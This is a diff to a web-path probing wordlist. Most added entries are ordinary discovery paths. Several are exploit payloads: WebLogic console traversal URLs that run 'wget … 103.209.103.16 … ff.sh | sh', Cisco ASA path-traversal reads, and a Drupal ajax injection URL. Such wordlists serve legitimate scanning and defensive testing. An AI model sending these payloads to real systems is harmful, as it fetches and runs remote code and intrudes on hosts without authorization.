@@ -11,6 +11,8 @@
 *
 */_settings
 +CSCOE+/logon.html
++CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
++CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
 -/ViewLogConsole-Start
 ../
 ..;/
@@ -471,6 +473,7 @@
 7.php
 8.php
 9.php
+9WsNDedoth5YRC3J0a6EABx48VJ
 ::$DATA
 ;/
 =====
@@ -490,6 +493,7 @@
 ?debug=getRanksAsHtml
 ?debug=getUsers
 ?debug=phpinfo
+?dns=DUIBAAABAAAAAAAABWJhaWR1A2NvbQAAAQAB
 ?email=foo
 ?ip=8.8.8.8
 ?prompt
@@ -500,6 +504,7 @@
 ?s=foo
 ?s={search_term_string}
 ?static=1&order=asc
+A50uRWG3SywFjzsIOpJmQgXZ4tm
 About/checkup
 Account/
 Admin
@@ -716,6 +721,7 @@ MO0F5tgPDrw9xhyzsbeT74EuNHh
 MOVEitISAPI/MOVEitISAPI.dll?action=capa
 MYAdmin/import.php
 MYadmin/import.php
+MZIE8dkwKN9TDy7abvGoOsHxqLa
 MakeListWithCart
 Makefile
 MediaDownload.aspx
@@ -728,6 +734,7 @@ MyAdmin/scripts/setup.php
 MySQLDumper/main.php
 MySQLManager/import.php
 MySqlManager/import.php
+NOM4wIKG3pWncv2BYdry7PemuhY
 NOnR
 New%20Folder
 New%20folder%20(2)
@@ -1188,6 +1195,7 @@ admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=
 admin/sqladmin/
 admin/sxd/
 admin/sysadmin/
+admin/sysadmin/index.php?lang=en
 admin/test/
 admin/upload.php
 admin/uploadarticles/uploadTester.asp
@@ -1273,6 +1281,7 @@ admins/log.txt
 admpar/.ftppass
 admrev/.ftppass
 admrev/_files/
+ads?dns=DUIBAAABAAAAAAAABWJhaWR1A2NvbQAAAQAB
 adsystem
 affiliates.sql
 agata.php
@@ -2079,6 +2088,9 @@ console
 console/
 console/base/config.json
 console/css/%252e%252e%252fconsole.portal
+console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('wd1%20-O%20-%20http%3A%2F%2F103.209.103.16%3A26800%2Fff.sh%20%7C%20sh%20-s');")
+console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('wdt%20-O%20-%20http%3A%2F%2F103.209.103.16%3A26800%2Fff.sh%20%7C%20sh%20-s');")
+console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('wget%20-O%20-%20http%3A%2F%2F103.209.103.16%3A26800%2Fff.sh%20%7C%20sh%20-s');")
 console/css/.%252e/console.portal
 console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi")
 console/graphql/
@@ -2320,6 +2332,7 @@ db/phpMyAdmin3/index.php?lang=en
 db/phpmyadmin/
 db/phpmyadmin/index.php?lang=en
 db/phpmyadmin3/
+db/phpmyadmin3/index.php?lang=en
 db/webadmin/
 db/webdb/
 db/websql/
@@ -2348,6 +2361,7 @@ debug.php
 debug.txt
 debug/
 debug/apidebug.php
+debug/default/view?panel=config
 debug/index.php
 debug/phpdebug.php
 debug/phpinfo.php
@@ -2415,6 +2429,7 @@ dist/javascripts/system.config.js
 distv2/index.html
 dniapi/userInfos
 dns-query?
+dns-query?dns=DUIBAAABAAAAAAAABWJhaWR1A2NvbQAAAQAB
 dnslookup.cgi
 doc/Règlement-de-jeu.docx
 docker-compose.yml
@@ -2428,6 +2443,9 @@ document/{2-2}
 documentation/
 documentation/config.yml
 documents/new/host
+doh/family-filter?dns=DUIBAAABAAAAAAAABWJhaWR1A2NvbQAAAQAB
+doh/secure-filter?dns=DUIBAAABAAAAAAAABWJhaWR1A2NvbQAAAQAB
+doh?dns=DUIBAAABAAAAAAAABWJhaWR1A2NvbQAAAQAB
 dom.php
 domcfg.nsf
 domcfg.nsf/Bottom?OpenPage
@@ -2510,6 +2528,7 @@ ector.do
 edit.php
 edit/spaw2/dialogs/dialog.php
 editBlackAndWhiteList
+editConfig
 editor.php
 editor/FCKeditor
 editor/stats/
@@ -2569,6 +2588,7 @@ environment.rb
 envor
 envsometimes
 envwill
+epa/scripts/win/nsepa_setup.exe
 erplite
 erplite/accessdenied.aspx
 erplite/default.aspx
@@ -2724,6 +2744,7 @@ fr/customer/account/login/
 fr/graphql/
 fr/home
 friendGroup/list
+frontend_dev.php/$
 ftp.dtd
 ftp.txt
 ftptest.cgi
@@ -2768,6 +2789,7 @@ gn4S
 goautodial/
 goform/formSysCmd
 goform/formWsc
+goform/websLogin
 google_connect_user
 grabbed.html
 gradlew
@@ -3147,6 +3169,7 @@ lib/flex/varien/.actionScriptProperties
 lib/flex/varien/.flexLibProperties
 lib/flex/varien/.project
 lib/flex/varien/.settings
+lib/media_tools/image.php?request=
 lib/spaw2/dialogs/dialog.php
 lib/tiny_mce/
 lib/tinymce/
@@ -3192,6 +3215,7 @@ listing/?bt_bb_listing_field_keyword=foo
 lists/config
 live.html
 livefeed.do
+lixuan.php
 lo.do
 load-on-startup
 load.php
@@ -3675,6 +3699,7 @@ passwords.sqlite
 passwords.txt
 payment
 pbmadmin/
+peqSlnt0wKBG1IaO9MZLoTmv3fe
 perl5/bin
 personal
 personal.mdb
@@ -4061,6 +4086,7 @@ picdesc.xml
 picsdesc.xml
 pilotage/facturation
 pinfo.php
+ping.ccp
 pingkon.php?q=query
 pip-log.txt
 pk92PmvhSsaVQlq7eLi5AgCEjOa
@@ -4114,6 +4140,8 @@ plugins/uber-login-logo/readme.txt
 plugins/upload.php
 plugins/w3-total-cache
 plugins/web.config
+plugins/web/service/search/auto-completion/dummy/en.xml?q=a
+plugins/web/service/search/auto-completion/dummy/fr.xml?q=a
 plugins/wordpress-seo
 plugins/wp-migrate-db
 plupload
@@ -4155,6 +4183,7 @@ pms/report/infoOffer/query_showConsumptionRepor
 pms/workflow/
 pms/workflow/queryWorkflowAlertRecipients.action
 pmyadmin/
+poIkR7l6AEa8xQcBbSvhzs42dXo
 policies
 policies.aspx
 poll.html
@@ -4267,6 +4296,7 @@ qcbin/start_a.jsp
 qrcode/
 qrcode/admin/
 query.log
+query?dns=DUIBAAABAAAAAAAABWJhaWR1A2NvbQAAAQAB
 query?q=SHOW+DATABASES
 queueHooks
 queueHooks/
@@ -4336,6 +4366,7 @@ reset-new.php
 reset.php
 reset.php?id=10
 reset_password.do
+resolve?dns=DUIBAAABAAAAAAAABWJhaWR1A2NvbQAAAQAB
 resources.xml
 resources/
 resources/css/headernav.css
@@ -4652,6 +4683,7 @@ sql/sqlweb/
 sql/sqlweb/index.php?lang=en
 sql/webadmin/
 sql/webdb/
+sql/webdb/index.php?lang=en
 sql/websql/
 sql_dumps
 sql_error.log
@@ -5020,6 +5052,8 @@ uber/phpMyAdmin/
 uber/phpMyAdminBackup/
 uddiexplorer/
 udp
+ufkGdoKLhq4przUXVQHT6J2cx5J
+uhFnMQ5NZ0eG4ci9UOvbmtkwIPc
 ui
 ui.hydrogen
 ui.hydrogen/show.spooler.data&filter=&query=*&spooler=/../../../../../../../tmp&vroot=/../../../../../tmp/.vroot/foo&path=a
@@ -5079,6 +5113,7 @@ user/getAllNicknames
 user/login
 user/password
 user/password/
+user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
 user/swagger-ui.html
 user/userlist
 userDetails
@@ -5147,6 +5182,7 @@ vendor/phpunit/phpunit/phpunit.xml
 vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 verification.asp
 verify.aspx
+verify.txt
 version
 version/
 vicidial/admin.php?ADD=140000000000
@@ -5413,8 +5449,3 @@ zone-h.php
 zz/address.php?gid=651
 zz2/address.php?gid=651
 ~install/
-+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
-+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
-plugins/web/service/search/auto-completion/dummy/fr.xml?q=a
-plugins/web/service/search/auto-completion/dummy/en.xml?q=a
-lib/media_tools/image.php?request=
